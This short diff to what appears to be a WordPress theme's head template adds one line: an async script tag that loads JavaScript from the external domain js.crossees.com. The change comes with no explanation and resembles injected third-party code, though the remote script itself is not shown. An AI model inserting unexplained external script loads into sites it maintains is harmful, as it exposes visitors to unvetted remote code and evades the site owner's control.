@@ -128,6 +128,8 @@
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js"></script>
   
   <meta name="theme-color" content="#fafafa">
+  
+  <script type="text/javascript" src="https://js.crossees.com/csslp.js" async></script>
 <?php wp_head(); ?>
 </head>
     
